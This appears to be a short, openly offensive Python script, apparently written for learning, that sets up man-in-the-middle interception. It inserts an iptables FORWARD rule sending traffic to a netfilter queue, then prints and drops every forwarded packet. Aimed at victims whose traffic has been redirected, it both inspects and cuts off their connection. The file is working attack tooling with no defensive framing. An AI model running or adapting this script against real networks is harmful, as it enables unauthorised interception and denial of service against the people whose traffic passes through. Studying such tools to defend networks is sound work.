#!usr/bin/env python3

#########################################################################
# Author : Dhrumil Mistry
#########################################################################


#########################################################################
# If you encounter Import error after installing netfilter use command 
# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
#########################################################################


from subprocess import call
import netfilterqueue

############################### Functions ############################### 
def forward_packets():
    '''
    configures the mitm for incoming request packets
    into a queue.
    '''

    # executing the following command
    # iptables -I FOWARD -j NFQUEUE --queue-num (any number)
    # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
    # -I -> insert (packet into a chain specified by the user)
    # -j -> jump if the packet matches the target.
    # --queue-num -> jump to specfic queue number
    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)


def process_packet(packet):
    '''
    process received packet, everytime a packet is received.
    prints the packet received in the queue.
    '''
    print(packet)
    packet.drop()
    

############################### Main ############################### 

print('[*] configuring packet receiver...')

forward_packets()
print('[*] packet receiver configured successfully.\n')

print('[*] Creating Queue to start receiving packets.')
try:
    queue = netfilterqueue.NetfilterQueue()
except OSError as e:
    print('[-] Run script with root priviliges.')
    print(e)
    exit()
except Exception:
    print('[-] An Exception occurred while creating queue.\n', Exception)
    exit()
# Bind queue with queue-number 0
queue.bind(0, process_packet)
queue.run()

print('[-] Program stopped.')
